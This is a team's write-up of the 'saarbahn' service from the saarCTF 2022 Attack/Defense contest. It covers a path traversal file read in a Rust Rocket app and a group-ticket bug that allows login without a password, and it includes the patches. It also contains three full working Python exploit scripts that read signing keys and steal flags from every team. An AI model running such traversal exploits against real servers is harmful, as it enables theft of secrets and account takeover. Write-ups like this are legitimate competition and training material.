# saarCTF 2022: saarbahn

Participant: Robert Obkircher

nufan: patched rust code, changed secrets

coil: implemented the python exploit scripts

## TL;DR / Short Summary

There was a service where users could generate train tickets and comment on stops.
The application was written in rust and contained a path traversal vulnerability that made it possible to read and write arbitrary files.
In addition, everyone had the same certificates,
and a bug made it possible to create group tickets for other users which could then be used to quick log in without a password.

## Task Description

SaarCTF is an Attack/Defense CTF contest where everyone receives a virtual machine with multiple services.
In general, the goal was to find vulnerabilities that can be used to steal flags from other teams but also to patch them in our own services.
There was an automated bot that verified that the services were operational, and it also stored flags in them.

There were no task descriptions for individual services.
However, for each service, there was a Linux user with some files in its home directory.
For `saarbahn` an entire rust project was available 
and there was also an endpoint https://scoreboard.ctf.saarland/attack.json with flag ids.

## Analysis Steps

The webserver runs at port 8000 and is only available with HTTPS.

> tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1002       13347      757/saarbahn

It is written in `Rust` and uses the `Rocket` web framework with `dyn_templates` to generate HTML pages.
It provides the following endpoints:

| Method   | url                    |
|----------|------------------------|
| get      | /                      |
| get+post | /login                 |
| get+post | /register              |
| get+post | /profile               |
| get      | /generate_ticket       |
| post     | /generate_group_ticket |
| post     | /check_ticket          |
| post     | /quick_login           |
| get      | /error                 |
| get      | /logout                |
| get+post | /stops/<name>          |

The database (see `schema.rs`) is only used to store users (id, username, first, last, email, password).

`GET /profile` and `POST /profile` read/write a personal comment from/to the file
```rust
    let file = "data/users/".to_string() + &email_hash;
```
where `email_hash` was a sha256 hash of the users email.

To sign tickets and group tickets the application uses HmacSha256.

```rust
fn sign_json(json: serde_json::Value) -> String {
    let data_string = json.to_string();
    match HmacSha256::new_from_slice(get_key().as_bytes()) {
    // ...
```

The function `get_key` either read the file `key.txt` or creates a new one with 16 random alphanumeric characters if it doesn't exist.

```rust
pub fn get_key() -> String {
    let mut path = env::current_dir().expect("Could not read current directory!");
    path.push("key.txt");
    // ...
```

One of the features of the website are group tickets.
You can send a list of friends to `POST /generate_group_ticket` and you get back a QR code that contains signed JSON data
that can later be sent to `POST /quick_login` to log in without a password.

The JSON contained an array of users and `quick_login` would just pick the first one:

```rust
    let data = ticket_json["data"].clone();
    match data {
        serde_json::Value::Array(array) => {   
            match &array[0]{
                serde_json::Value::String(mail) => {
                    let mail = String::from(mail);
                    let response = format!("Could not find user with email {}", mail);
                    let result = conn
                        .run(move |c| load_single_user(c, mail))
                        .await;
```


## Vulnerabilities / Exploitable Issue(s)

The application stores `username`, `first`, `last` and `email` in signed and encrypted cookies.
The `secret_key` was stored in `Rocket.toml` and had to be changed.

`POST /stops/<name>` appends a comment for a stop to the file `data/stops/{id}` where `{id}` was the name of the stop.
`GET /stops/<name>` reads it back.
Both of these were vulnerable to path traversal because they simply added `<name>` to the end of the path.
For example, the URL https://10.32.1.2:8000/stops/%2E%2E%2F%2E%2E%2Fkey.txt could be used to read the secret from `key.txt`. 
Note that `../` has to be URL encoded as `%2e%2e%2f` because otherwise, it wouldn't be the correct endpoint.

The generation of group tickets contained a bug that made it possible to sign a ticket for a different user and log in without a password.

## Solution

### Patch path traversal

`GET+POST /stops/<name>` called two functions in `comment.rs`. 
To patch them we created a helper function to check the directory

```rust
fn is_valid_stop(stop: &Path) -> bool {
    return stop.canonicalize().unwrap().starts_with("/home/saarbahn/saarbahn/data/stops");
}
```

and added it to the two functions:

```rust
pub fn get_ratings(stop: String) -> Vec<String> {
    let mut path = env::current_dir().expect("Could not read current directory!");
    path.push("data/stops/");
    path.push(stop);

    if !is_valid_stop(&path) {
        return Vec::new();
    }
    // ...
```

```rust
/// Write comment to file. If it exists, append and separate by ,
pub fn write_rating(stop: String, comment: String) -> Result<(), std::io::Error> {
    let comment = comment.replace(',', ";");
    let comment = comment + ",";
    let file = "data/stops/".to_string() + &stop;
    let mut path = env::current_dir()?;
    path.push("data/");
    path.push("stops/");
    let dir_metadata = fs::metadata(&path);
    if dir_metadata.is_err() {
        fs::create_dir_all(path).expect("Could not create directory!");
    }

    let filepath = Path::new(&file);

    if !is_valid_stop(&filepath) {
        return Ok(())
    }
    // ...
```

### Change secrets

After patching the arbitrary file read vulnerability we changed some secrets.

We changed the `secret_key` in the configuration file `Rocket.toml` because it was used for signing login cookies.
I do not remember if we also changed the TLS certificates.

```toml
[default]
secret_key = "itlYmFR2vYKrOmFhupMIn/hyB6lYCCTXz4yaQX89XVg="
# ...
[global.tls]
certs = "./cert.pem"
key = "./key.pem"
# ...
```

The file `key.txt` is used to sign JSON, so it also had to be changed.
We also wrote a script to steal `key.txt` from other teams (see [Failed Attempts](#failed-attempts)) but we didn't end up using them.

### Patch generate_group_ticket

Below is the git diff of our changes.
The previous version of the code added the user's email to the end of the `friends_vec` and reversed it afterward.
The problem was that if the user was already in the list then only that first occurrence would have been kept.

```rust
@@ -285,16 +285,16 @@ fn generate_group_ticket(user: User, friends: Form<GroupTicket>) -> Template {
     let mail = user.email;
 
     let mut friends_vec = friends.friends.to_vec();
-    friends_vec.push(mail);
 
     let mut list = Vec::new();
 
     friends_vec.iter().for_each(|friend| {
         let friend_string = friend.to_string();
-        if !list.contains(&friend_string) {
+        if !list.contains(&friend_string) && friend_string != mail {
             list.insert(0, friend_string);
         }
     });
+    list.insert(0, mail);
```

### First exploit script

This was the first version of our exploit script (`saarbahn_script/attack_template.py`).

It uses the flag ids (emails) and the arbitrary file read vulnerability to request `https://"+target_ip+":8000/stops/%2E%2E%2Fusers%2F" + hashlib.sha256(flagid).hexdigest()`.

```python
#!/usr/bin/env python3
from pwn import *
import re
import time
from typing import Set
import requests
import multiprocessing


NOP_TEAM_ID = 1
OUR_TEAM_ID = 66
SKIPPED_TEAMS = {OUR_TEAM_ID, NOP_TEAM_ID}
NUM_TEAMS = 165

MIN_ATTACK_ITERATION_DURATION = 120     # Duration in seconds an attack iteration should take.
                                        # If we are faster, we wait.

FLAG_SUBMISSION_HOST = "submission.ctf.saarland"
FLAG_SUBMISSION_PORT = 31337
FLAG_REGEX = re.compile(r"SAAR\{[A-Za-z0-9-_]{32}\}")

SERVICE_PORT = 8000                     # TODO adjust to your service
FLAG_STORAGE_NAME = f"saarCTF.{SERVICE_PORT}.flags"
context.log_level = "info"              # Change to "debug" for more output
context.timeout = 5

flag_ids = []

def get_target_vulnbox_ip(target_id: int) -> str:
    return f"10.{32 + target_id // 200}.{target_id % 200}.2"


def is_valid_flag(flag: str) -> bool:
    return FLAG_REGEX.fullmatch(flag) is not None


def attack(target_ip: str) -> Set[str]:
    # TODO implement :)
    # Make sure you use timeouts when connecting to remote services
    log.debug(f"Attacking {target_ip}:{SERVICE_PORT}")

    flagids_local = flag_ids["flag_ids"]["saarbahn"]
    if target_ip not in flagids_local:
        return set()

    flagids_local = flagids_local[target_ip]
    flags_total = set()
    last=len(flagids_local)
    i = 0
    for flagid in flagids_local:
        if i < last - 4:
            i += 1
            continue
        i += 1
        print(flagids_local[flagid])
        flagid = flagids_local[flagid].encode('utf-8')

        import hashlib
        bla = hashlib.sha256(flagid).hexdigest()
        # print(bla)
        resp = requests.get("https://"+target_ip+":8000/stops/%2E%2E%2Fusers%2F" + bla, verify=False, timeout=10)
        flags = re.findall(FLAG_REGEX, resp.text)
        print(flags)
        flags_total = flags_total.union(set(flags))
    return flags_total


def attack_target(target_ip):
    try:
        target_flags = attack(target_ip)
        return target_flags

    except Exception as e:
        log.warning("Something failed, but we go on.", e)


def main():
    submitted_flags = set()

    if os.path.exists(FLAG_STORAGE_NAME):
        with open(FLAG_STORAGE_NAME, "r") as f:
            data = f.read()
        submitted_flags = set(data.split("\n"))
        log.info(f"Loaded {len(submitted_flags)} flags from storage file")
    else:
        log.info("Storage file does not exist, starting from scratch")

    while True:
        attack_iteration_start_time = time.time()
        global flag_ids
        flag_ids = requests.get("https://scoreboard.ctf.saarland/attack.json").json()

        # Iterate over all teams and attack them

        target_ips = []
        for target_id in range(1, NUM_TEAMS + 1):
            if target_id in SKIPPED_TEAMS:
                continue

            target_ips.append(get_target_vulnbox_ip(target_id))

        def chunks(l, n):
            n = max(1, n)
            return (list(l[i:i + n]) for i in range(0, len(l), n))

        for split_target_ips in chunks(target_ips, 6):
            print(split_target_ips)
            flags = []
            with multiprocessing.Pool() as pool:
                for flag_lists in pool.map(attack_target, list(split_target_ips)):
                    if flag_lists is None:
                        continue
                    for f in flag_lists:
                        flags.append(f)

            flags = set(flags)

            num_new_flags_submitted = 0
            to_submit = ""
            for new_flag in (flags - submitted_flags):
                if not is_valid_flag(new_flag):
                    continue

                to_submit += (new_flag) + "\n"
                submitted_flags.add(new_flag)
                num_new_flags_submitted = num_new_flags_submitted + 1

            submission_response = submit_flag(to_submit,
                                              server=FLAG_SUBMISSION_HOST,
                                              port=FLAG_SUBMISSION_PORT).decode()
            log.info(f"Response: {submission_response}")


            if num_new_flags_submitted > 0:
                log.info(f"Submitted {num_new_flags_submitted} new flags, updating flag storage")
                with open(FLAG_STORAGE_NAME, "w") as f:
                    f.write("\n".join(submitted_flags))
            else:
                log.info("No new flags submitted")

        attack_iteration_end_time = time.time()
        attack_iteration_duration = int(attack_iteration_end_time - attack_iteration_start_time)
        log.info(f"Attack iteration took {attack_iteration_duration} seconds")

        if attack_iteration_duration < MIN_ATTACK_ITERATION_DURATION:
            sleep_duration = MIN_ATTACK_ITERATION_DURATION - attack_iteration_duration
            log.info(f"Sleeping {sleep_duration} seconds")
            time.sleep(sleep_duration)


if __name__ == "__main__":
    main()
```

### Exploit group tickets

This script (`saarbahn_script/attack_template_exploit2.py`) registers a new user and generates a group ticket for each flag id.
The response is parsed with beautiful soup and the ASCII QR code is converted to an image and then decoded with the `pyzbar` library.
The flags are extracted from the response of `quick_login` with a regex.

```python
#!/usr/bin/env python3
from pwn import *
import re
import time
from typing import Set
import requests
import multiprocessing


NOP_TEAM_ID = 1
OUR_TEAM_ID = 66
SKIPPED_TEAMS = {OUR_TEAM_ID, NOP_TEAM_ID}
NUM_TEAMS = 165

MIN_ATTACK_ITERATION_DURATION = 120     # Duration in seconds an attack iteration should take.
                                        # If we are faster, we wait.

FLAG_SUBMISSION_HOST = "submission.ctf.saarland"
FLAG_SUBMISSION_PORT = 31337
FLAG_REGEX = re.compile(r"SAAR\{[A-Za-z0-9-_]{32}\}")

SERVICE_PORT = 8000                     # TODO adjust to your service
FLAG_STORAGE_NAME = f"saarCTF.{SERVICE_PORT}.flags"
context.log_level = "info"              # Change to "debug" for more output
context.timeout = 5

flag_ids = []

def get_target_vulnbox_ip(target_id: int) -> str:
    return f"10.{32 + target_id // 200}.{target_id % 200}.2"


def is_valid_flag(flag: str) -> bool:
    return FLAG_REGEX.fullmatch(flag) is not None


def attack(target_ip: str) -> Set[str]:
    # TODO implement :)
    # Make sure you use timeouts when connecting to remote services
    log.debug(f"Attacking {target_ip}:{SERVICE_PORT}")

    flagids_local = flag_ids["flag_ids"]["saarbahn"]
    if target_ip not in flagids_local:
        return set()

    flagids_local = flagids_local[target_ip]
    flags_total = set()
    last=len(flagids_local)
    i = 0
    for flagid in flagids_local:
        if i < last - 4:
            i += 1
            continue
        i += 1
        print(flagids_local[flagid])
        flagid = flagids_local[flagid].encode('utf-8')

        ip = "10.32.1.2"

        HOST = "https://" + target_ip + ":8000"
        targetEmail = flagid

        import string
        import random

        letters = string.ascii_lowercase
        username = ''.join(random.choice(letters) for i in range(20))
        password = ''.join(random.choice(letters) for i in range(20))

        email = username + "@" + password + ".at"

        import requests
        import re
        import bs4

        s = requests.Session()
        resp = s.post(HOST + "/register",
                      data={"username": username, "first": "asb", "last": "my", "email": email, "password": password},
                      verify=False, timeout=5)

        resp = s.post(HOST + "/generate_group_ticket", data={"friends": [email, targetEmail]}, verify=False, timeout=5)

        soup = bs4.BeautifulSoup(resp.text, 'html.parser')
        c = soup.find("code")

        arr = []

        lines = c.contents[0].split("\n")[1:-2]
        for l in lines:
            cols = [[], []]
            # print(l[2:])
            for ch in l[1:]:
                if ch == " ":
                    cols[0].append(255)
                    cols[1].append(255)
                elif ch == "█":
                    cols[0].append(0)
                    cols[1].append(0)

                elif ch == "▀":
                    cols[0].append(0)
                    cols[1].append(255)

                elif ch == "▄":
                    cols[0].append(255)
                    cols[1].append(0)
                else:
                    raise ValueError("unknown")
            arr.append(cols[0])
            arr.append(cols[1])

        from PIL import Image
        import numpy as np

        img = Image.fromarray(np.array(arr).astype('uint8'), mode='L')
        img = img.resize((200, 200))

        from pyzbar.pyzbar import decode
        data = decode(img)
        data = (data[0].data)

        s2 = requests.Session()
        resp = s2.post(HOST + "/quick_login", data={"ticket": data}, verify=False, timeout=5)

        flags = re.findall(FLAG_REGEX, resp.text)
        print(flags)
        flags_total = flags_total.union(set(flags))
    return flags_total


def attack_target(target_ip):
    try:
        target_flags = attack(target_ip)
        return target_flags

    except Exception as e:
        log.warning("Something failed, but we go on.", e)


def main():
    submitted_flags = set()

    if os.path.exists(FLAG_STORAGE_NAME):
        with open(FLAG_STORAGE_NAME, "r") as f:
            data = f.read()
        submitted_flags = set(data.split("\n"))
        log.info(f"Loaded {len(submitted_flags)} flags from storage file")
    else:
        log.info("Storage file does not exist, starting from scratch")

    while True:
        attack_iteration_start_time = time.time()
        global flag_ids
        flag_ids = requests.get("https://scoreboard.ctf.saarland/attack.json").json()

        # Iterate over all teams and attack them

        target_ips = []
        for target_id in range(1, NUM_TEAMS + 1):
            if target_id in SKIPPED_TEAMS:
                continue

            target_ips.append(get_target_vulnbox_ip(target_id))

        def chunks(l, n):
            n = max(1, n)
            return (list(l[i:i + n]) for i in range(0, len(l), n))

        for split_target_ips in chunks(target_ips, 6):
            print(split_target_ips)
            flags = []
            with multiprocessing.Pool() as pool:
                for flag_lists in pool.map(attack_target, list(split_target_ips)):
                    if flag_lists is None:
                        continue
                    for f in flag_lists:
                        flags.append(f)

            flags = set(flags)

            num_new_flags_submitted = 0
            to_submit = ""
            for new_flag in (flags - submitted_flags):
                if not is_valid_flag(new_flag):
                    continue

                to_submit += (new_flag) + "\n"
                submitted_flags.add(new_flag)
                num_new_flags_submitted = num_new_flags_submitted + 1

            submission_response = submit_flag(to_submit,
                                              server=FLAG_SUBMISSION_HOST,
                                              port=FLAG_SUBMISSION_PORT).decode()
            log.info(f"Response: {submission_response}")


            if num_new_flags_submitted > 0:
                log.info(f"Submitted {num_new_flags_submitted} new flags, updating flag storage")
                with open(FLAG_STORAGE_NAME, "w") as f:
                    f.write("\n".join(submitted_flags))
            else:
                log.info("No new flags submitted")

        attack_iteration_end_time = time.time()
        attack_iteration_duration = int(attack_iteration_end_time - attack_iteration_start_time)
        log.info(f"Attack iteration took {attack_iteration_duration} seconds")

        if attack_iteration_duration < MIN_ATTACK_ITERATION_DURATION:
            sleep_duration = MIN_ATTACK_ITERATION_DURATION - attack_iteration_duration
            log.info(f"Sleeping {sleep_duration} seconds")
            time.sleep(sleep_duration)


if __name__ == "__main__":
    main()
```

## Failed Attempts

For a long time our scripts only requested the flag ids at startup. That mistake cost us a lot of points.

We used the script `./saarbahn_keys.py` to read `key.txt` from other teams, but we didn't end up using them.
```python
#!/usr/bin/env python3
from pwn import *
import re
import requests
import time
from typing import Set


NOP_TEAM_ID = 1
OUR_TEAM_ID = 66
SKIPPED_TEAMS = {OUR_TEAM_ID, NOP_TEAM_ID}
NUM_TEAMS = 165

MIN_ATTACK_ITERATION_DURATION = 120     # Duration in seconds an attack iteration should take.
                                        # If we are faster, we wait.

FLAG_SUBMISSION_HOST = "submission.ctf.saarland"
FLAG_SUBMISSION_PORT = 31337
FLAG_REGEX = re.compile(r"SAAR\{[A-Za-z0-9-_]{32}\}")

SERVICE_PORT = 8000
context.log_level = "info"              # Change to "debug" for more output


def get_target_vulnbox_ip(target_id: int) -> str:
    return f"10.{32 + target_id // 200}.{target_id % 200}.2"


def main():
    for target_id in range(1, NUM_TEAMS + 1):
        if target_id in SKIPPED_TEAMS:
            continue

        target_ip = get_target_vulnbox_ip(target_id)
        try:
            response = requests.get(f"https://{target_ip}:{SERVICE_PORT}/stops/..%2F..%2Fkey.txt", verify=False, timeout=3)
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError):
            continue
        with open(f"key.txt.{target_id}", "w") as f:
            f.write(response.text)


if __name__ == "__main__":
    main()
```

Toward the end, we also tried to sign login cookies using the original certificates, however, that didn't work for some reason.

## Alternative Solutions

After the CTF all services, including source code, checkers, and exploits for all vulnerabilities were published on Github: https://github.com/saarsec/saarctf-2022

## Lessons Learned

I learned how to use svn.

This was my first time participating in an Attack/Defence CTF. 
It was more stressful than Jeopardy-style.

## References

saarctf website: https://ctf.saarland/

official repository: https://github.com/saarsec/saarctf-2022
